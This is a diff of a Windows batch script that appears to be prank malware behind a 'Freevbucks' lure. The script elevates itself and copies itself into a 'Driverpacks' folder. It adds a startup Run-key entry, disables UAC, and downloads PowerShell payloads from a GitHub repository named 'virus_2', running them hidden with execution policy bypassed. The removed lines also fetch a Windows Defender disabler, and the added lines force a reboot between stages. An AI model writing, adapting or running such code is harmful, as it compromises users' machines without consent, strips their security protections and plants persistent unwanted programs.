@@ -1,102 +1,53 @@
 @echo off
-:: Check if the script is already running as administrator
+setlocal ENABLEEXTENSIONS
+set SEE_MASK_NOZONECHECKS=1
+
+:: 1. ADMIN CHECK
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    echo Requesting administrator privileges...
-    :: Relaunch the script with elevated rights
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
-
-curl -O Disable_windows_defender.ps1 https://raw.githubusercontent.com/DanielNov2014/virus_2/refs/heads/main/resources/Disable_windows_defender.ps1 > Disable_windows_defender.ps1
-curl -O gdi.ps1 https://raw.githubusercontent.com/DanielNov2014/virus_2/refs/heads/main/resources/gdi.ps1 > gdi.ps1
-
-
-@echo off
-setlocal ENABLEEXTENSIONS
-
-set "Key=HKCU\Software\Freevbucks"
-set "ValueName=Stage"
-set "DefaultValue=1"
-
-:: Check if the key exists
-reg query "%Key%" >nul 2>&1
-if errorlevel 1 (
-   
-    reg add "%Key%" /f >nul
-) else (
-   
-)
-
-:: Check if the value exists
-reg query "%Key%" /v "%ValueName%" >nul 2>&1
-if errorlevel 1 (
-    echo Value not found. Creating value...
-    reg add "%Key%" /v "%ValueName%" /t REG_DWORD /d %DefaultValue% /f >nul
-) else (
-  
-)
-
-
-endlocal
-
-@echo off
-setlocal ENABLEEXTENSIONS
-
-:: === CONFIGURATION ===
+:: 2. CONFIGURATION
 set "TargetFolder=%USERPROFILE%\Driverpacks"
 set "TargetFile=%TargetFolder%\Mouse.bat"
-set "StartupName=Driverpacks"
+set "Key=HKCU\Software\Freevbucks"
 
-
-:: === DETECT IF ALREADY IN TARGET LOCATION ===
-if /i "%~f0"=="%TargetFile%" (
-    echo Running from target folder: %TargetFolder%
-    goto :ContinueMain
+:: 3. PERSISTENCE & UNBLOCKING
+if /i "%~f0" neq "%TargetFile%" (
+    if not exist "%TargetFolder%" mkdir "%TargetFolder%"
+    copy "%~f0" "%TargetFile%" /Y >nul
+    powershell -Command "Unblock-File -Path '%TargetFile%'"
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Driverpacks" /t REG_SZ /d "\"%TargetFile%\"" /f >nul
+    start "" "%TargetFile%"
+    exit /b
 )
 
-:: === CREATE TARGET FOLDER IF MISSING ===
-if not exist "%TargetFolder%" (
-    mkdir "%TargetFolder%" || (
-        echo Failed to create folder.
-        exit /b 1
-    )
+:: 4. STAGE DETECTION
+reg query "%Key%" /v "Stage" >nul 2>&1
+if errorlevel 1 reg add "%Key%" /v "Stage" /t REG_DWORD /d 1 /f >nul
+
+for /f "tokens=3" %%A in ('reg query "%Key%" /v "Stage" ^| findstr "Stage"') do set /a currentStage=%%A
+
+:: --- STAGE 1: GDI MELT & REBOOT ---
+if %currentStage%==1 (
+    curl -L -s -o "%TargetFolder%\gdi.ps1" "https://raw.githubusercontent.com/DanielNov2014/virus_2/main/resources/gdi.ps1"
+    powershell -Command "Unblock-File -Path '%TargetFolder%\gdi.ps1'"
+    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul
+    reg add "%Key%" /v "Stage" /t REG_DWORD /d 2 /f >nul
+    
+    :: Start GDI and wait 15 seconds before rebooting
+    start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TargetFolder%\gdi.ps1"
+    timeout /t 15
+    shutdown /r /f /t 0
+    exit /b
 )
 
-:: === COPY SCRIPT TO TARGET ===
-copy "%~f0" "%TargetFile%" /Y >nul || (
-    echo Failed to copy script.
-    exit /b 1
+:: --- STAGE 2: THE AUDIO TROLL ---
+if %currentStage%==2 (
+    curl -L -s -o "%TargetFolder%\logic.ps1" "https://raw.githubusercontent.com/DanielNov2014/virus_2/main/resources/troll_logic.ps1"
+    powershell -Command "Unblock-File -Path '%TargetFolder%\logic.ps1'"
+    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TargetFolder%\logic.ps1"
+    exit /b
 )
-
-:: === ADD TO STARTUP (HKCU\...\Run) ===
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
-    /v "%StartupName%" /t REG_SZ /d "\"%TargetFile%\"" /f >nul || (
-    echo Failed to add startup entry.
-    exit /b 1
-)
-
-:: === DELETE ORIGINAL SCRIPT ===
-del "%~f0"
-
-:: === START THE NEW COPY AND EXIT ===
-start "" "%TargetFile%"
-exit /b
-
-:ContinueMain
-REM Get the directory of the batch file
-set "SCRIPT_DIR=%~dp0"
-
-REM Run the PowerShell script from the same directory
- Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
-
- powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_DIR%Disable_windows_defender.ps1"
- del Disable_windows_defender.ps1
-
- powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT_DIR%gdi.ps1"
-
-endlocal
-
-
-
